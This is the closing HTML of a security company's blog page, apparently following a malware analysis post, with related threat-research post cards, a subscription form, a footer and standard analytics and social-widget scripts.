<section id="u4m-blog-post-cards" class="u4m-blog-post-cards u4m-blog-post-cards   
" style=" 
">


  
  




  

  

  

  

  

  



  

    
    <div class="top-wrapper">
      
        <h2 class="heading">More from the blog</h2>
      
      
      
        <a class="link" href="https://www.cadosecurity.com/blog">View All Posts</a>
      
    </div>
    
  
    <div class="wrapper">
      
        
        
  
            

  



  


 
  
 
<a class="blog-post-card" href="https://www.cadosecurity.com/blog/spinning-yarn-a-new-linux-malware-campaign-targets-docker-apache-hadoop-redis-and-confluence">

  <div class="inner">
    <div class="featured-icon">
      <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/Custom/Blog%20and%20Resources/Announcements.svg" alt="Research &amp; Threat Intel icon" loading="lazy" width="40">
    </div> 

    <div class="content">

      
      <div class="topic-wrapper">
        <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/blog-icon.svg" alt="blog icon" width="10" height="10" loading="lazy">
        
        
            
              
                 <span class="topic">Research &amp; Threat Intel</span>
              
              
            
        
      </div>
      

      <h5 class="title">Spinning YARN - A New Linux Malware Campaign Targets Docker, Apache Hadoop, Redis and Confluence</h5>

      <span class="date">March 6, 2024</span>
    
      <p class="teaser">Introduction Cado Security Labs researchers have recently encountered an emerging malware campaign targeting misconfigured...</p>

      <div class="read-more"><span>Continue Reading</span></div>
    </div>
  </div>

</a>
        

  
            

  



  


 
  
 
<a class="blog-post-card" href="https://www.cadosecurity.com/blog/qubitstrike-an-emerging-malware-campaign-targeting-jupyter-notebooks">

  <div class="inner">
    <div class="featured-icon">
      <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/Custom/Blog%20and%20Resources/Announcements.svg" alt="Research &amp; Threat Intel icon" loading="lazy" width="40">
    </div> 

    <div class="content">

      
      <div class="topic-wrapper">
        <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/blog-icon.svg" alt="blog icon" width="10" height="10" loading="lazy">
        
        
            
              
                 <span class="topic">Research &amp; Threat Intel</span>
              
              
            
        
      </div>
      

      <h5 class="title">Qubitstrike - An Emerging Malware Campaign Targeting Jupyter Notebooks</h5>

      <span class="date">October 18, 2023</span>
    
      <p class="teaser">Qubitstrike Discord C2 operation Summary First reported case of Codeberg code hosting platform used to distribute malware...</p>

      <div class="read-more"><span>Continue Reading</span></div>
    </div>
  </div>

</a>
        

  
            

  



  


 
  
 
<a class="blog-post-card" href="https://www.cadosecurity.com/blog/tales-from-the-honeypot-watchdog-evolves-with-a-new-multi-stage-cryptojacking-attack">

  <div class="inner">
    <div class="featured-icon">
      <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/Custom/Blog%20and%20Resources/Announcements.svg" alt="Cloud Investigations icon" loading="lazy" width="40">
    </div> 

    <div class="content">

      
      <div class="topic-wrapper">
        <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/blog-icon.svg" alt="blog icon" width="10" height="10" loading="lazy">
        
        
            
              
                 <span class="topic">Cloud Investigations</span>
              
              
            
        
            
        
      </div>
      

      <h5 class="title">Tales From the Honeypot: WatchDog Evolves With a New Multi-Stage Cryptojacking Attack</h5>

      <span class="date">June 2, 2022</span>
    
      <p class="teaser">Summary Cado Labs’ honeypot infrastructure was recently compromised by a complex and multi-stage cryptojacking attack...</p>

      <div class="read-more"><span>Continue Reading</span></div>
    </div>
  </div>

</a>
        


      
  
      
      
    
      
           
      
      
         
      
    </div>  
  </section></div>
  <div id="hs_cos_wrapper_u4m-subscribe" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">




<section id="u4m-subscribe" class="u4m-subscribe u4m-subscribe   
" style=" 
">



  




  

  

  

  

  

  




<div class="wrapper">
  <div class="inner">
    <img data-aos="fade-right" data-aos-duration="800" class="top-image" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Images/cloud-top.svg" alt="cloud image" loading="lazy">
    <img data-aos="fade-left" data-aos-duration="800" class="left-image" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Images/Clouds/subscribe-cloud.svg" alt="cloud image" loading="lazy">
    <div class="intro">
      <h3 class="heading">Subscribe to Our Blog</h3>
      <p class="subheading">To stay up to date on the latest from Cado Security, subscribe to our blog today.</p>
    </div>

    <div class="form-area" data-blog-id="156179862661">
      
        <span id="hs_cos_wrapper_u4m-subscribe_blog_subscribe" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="blog_subscribe">
<div id="hs_form_target_u4m-subscribe_blog_subscribe_1691"></div>



</span>
      
      
    </div>  
  </div>
</div>
</section></div>
</main>


    
        <div id="hs_cos_wrapper_u4m-footer" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><footer class="u4m-footer">

  <div class="inner">

      <div class="menu">
          <div id="hs_menu_wrapper_u4m-footer_" class="hs-menu-wrapper active-branch no-flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="default" data-menu-id="156295033863" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Product</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/platform" role="menuitem">Platform</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/environments" role="menuitem">Environments</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/integrations" role="menuitem">Integrations</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="https://www.cadosecurity.com/solutions" aria-haspopup="true" aria-expanded="false" role="menuitem">Solutions by Use Case</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/cross-cloud-investigations" role="menuitem">Cross Cloud Investigations</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/container-and-k8s-investigations" role="menuitem">Container &amp; K8s Investigations</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/endpoint-triage" role="menuitem">Endpoint Triage</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/saas-investigations" role="menuitem">SaaS Investigations</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/cloud-detection-and-response" role="menuitem">Cloud Detection &amp; Response (CDR)</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/evidence-preservation" role="menuitem">Evidence Preservation</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="https://www.cadosecurity.com/solutions" aria-haspopup="true" aria-expanded="false" role="menuitem">Solutions by Industry</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/dfir" role="menuitem">DFIR</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/security-operations-center" role="menuitem">SOC</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/mssp" role="menuitem">MSSPs</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/partners" role="menuitem">Partners</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/government" role="menuitem">Government</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="https://www.cadosecurity.com/resources" aria-haspopup="true" aria-expanded="false" role="menuitem">Resources</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/resources" role="menuitem">All Resources</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/blog" role="menuitem">Blog</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="/resources#playbook" role="menuitem">Playbooks</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="/resources#cheat-sheet" role="menuitem">Cheat Sheets</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/news-and-events" role="menuitem">News</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/cado-community-edition" role="menuitem">Community</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://docs.cadosecurity.com/cado-response/intro" role="menuitem" target="_blank" rel="noopener">Documentation</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/wiki" role="menuitem">Wiki</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Company</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/about" role="menuitem">About</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/careers" role="menuitem">Careers</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/cado-security-labs" role="menuitem">Cado Security Labs</a></li>
   </ul></li>
 </ul>
</div>
      </div>
   
      <div class="lower-menu">
        <div class="lower-links">
          <div class="social">
            <ul>
              
              
              <li>
                <a href="https://twitter.com/CadoSecurity" target="_blank" aria-label="Twitter" rel="noopener">
                  <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/x-icon.svg" alt="Twitter X icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://www.linkedin.com/company/cado-security/" target="_blank" aria-label="LinkedIn" rel="noopener">
                 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/LinkedIn_Logo.svg" alt="LinkedIn icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://aws.amazon.com/marketplace/seller-profile?id=38874fd2-b585-412f-992a-cf111bbca38a" target="_blank" aria-label="Amazon" rel="noopener">
                  <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/Amazon_icon.svg" alt="Amazon icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://github.com/cado-security" target="_blank" aria-label="GitHub" rel="noopener">
                  <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/github-mark.svg" alt="GitHub icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://azuremarketplace.microsoft.com/en-us/marketplace/apps/cadosecurityltd1626856705534.cado-response?tab=Overview" target="_blank" aria-label="Azure" rel="noopener">
                 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/azure-logo-white-circle-1-600x600.svg" alt="Azure icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://console.cloud.google.com/marketplace/product/cado-public/cado-response?pli=1" target="_blank" aria-label="Google Cloud" rel="noopener">
                   <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/google-cloud-icon-2048x1646-7admxejz.svg" alt="Google Cloud icon" loading="lazy">
                </a>
              </li>
              

            </ul>
          </div>
          
          <div class="links">
              <div class="copyright">Copyright© 2024, Cado Security, All Rights Reserved <a href="/privacy-policy/">Privacy Policy</a></div>
            </div>
        </div>

         <div class="logo">
          <a href="https://www.cadosecurity.com/">
            <img loading="lazy" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/footer-logo.svg" width="144" height="29" alt="footer-logo">
          </a>
        </div>
      </div>
    </div>
  </footer></div>

    
    
    
    <script src="/hs/hsstatic/jquery-libs/static-1.1/jquery/jquery-1.7.1.js"></script>
<script>hsjQuery = window['jQuery'];</script>
<!-- HubSpot performance collection script -->
<script defer src="https://static.hsappstatic.net/content-cwv-embed/static-1.1293/embed.js"></script>

<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-core.min.js" integrity="sha256-4mJNT2bMXxcc1GCJaxBmMPdmah5ji0Ldnd79DKd1hoM=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha256-AjM0J5XIbiB590BrznLEgZGLnOQWrt62s3BEq65Q/I0=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.js" integrity="sha256-NSwb7O0HrDJcC+2SASgGuCP8+tdpIhqnzLTZkGRJRCk=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js" integrity="sha256-qf3MqHLzDh4qqAnc9QVmqjEWBA4CfzP1YwRFbfNfpnE=" crossorigin="anonymous"></script>
<script>
// Stick sharing
document.addEventListener('DOMContentLoaded', function() {

    var Sticky = new hcSticky('#share', {
      stickTo: '.u4m-blog-post .body',
      top: 150
    });
  
});
</script>

<script src="//cdn2.hubspot.net/hub/14518100/hub_generated/template_assets/156174727468/1712250848645/cado-unified4-srw/js/main.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/scripts/jquery-3.5.1.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified3/libraries/hubspot.search.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified3/libraries/jquery.nb.offscreenMenuToggle.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified3/libraries/aos3.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified-assets/lazyload.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/unified3/libraries/js.cookie.min.js"></script>
<script src="https://302335.fs1.hubspotusercontent-na1.net/hubfs/302335/hc-sticky.js"></script>
<script src="https://14518100.fs1.hubspotusercontent-na1.net/hub/14518100/hub_generated/module_assets/156175596464/1728675367793/module_156175596464_u4m-header.min.js"></script>

    <!--[if lte IE 8]>
    <script charset="utf-8" src="https://js.hsforms.net/forms/v2-legacy.js"></script>
    <![endif]-->

<script data-hs-allowed="true" src="/_hcms/forms/v2.js"></script>

  <script data-hs-allowed="true">
      hbspt.forms.create({
          portalId: '14518100',
          formId: 'd29e7ad7-b066-4fe0-b1ea-e5dcd4c55e5a',
          formInstanceId: '1691',
          pageId: '156195002170',
          region: 'na1',
          
          pageName: 'The Nine Lives of Commando Cat: Analysing a Novel Malware Campaign Targeting Docker',
          
          contentType: 'blog-post',
          
          formsBaseUrl: '/_hcms/forms/',
          
          
          inlineMessage: "<p>Thanks for subscribing!</p>",
          
          css: '',
          target: '#hs_form_target_u4m-subscribe_blog_subscribe_1691',
          
          formData: {
            cssClass: 'hs-form stacked'
          }
      });
  </script>


<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.cadosecurity.com\/blog\/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker"]);
_hsq.push(["setPageId", "156195002170"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 156195002170,
    "legacyPageId": "156195002170",
    "contentFolderId": null,
    "contentGroupId": 156179862661,
    "abTestId": null,
    "languageVariantId": 156195002170,
    "languageCode": "en",
    
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/14518100.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "d6db33d4-8ea4-4e1f-bf71-683dd5ea932f",
    ticks: 1729736943981,
    page_id: 156195002170,
    
    content_group_id: 156179862661,
    portal_id: 14518100,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    scp_content_type: "",
    analytics_page_id: "156195002170",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.354/js/index.js"></script>

<!--
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P9BDTK9"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 -->

<div id="fb-root"></div>
  <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v3.0";
  fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));</script> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 



</body></html>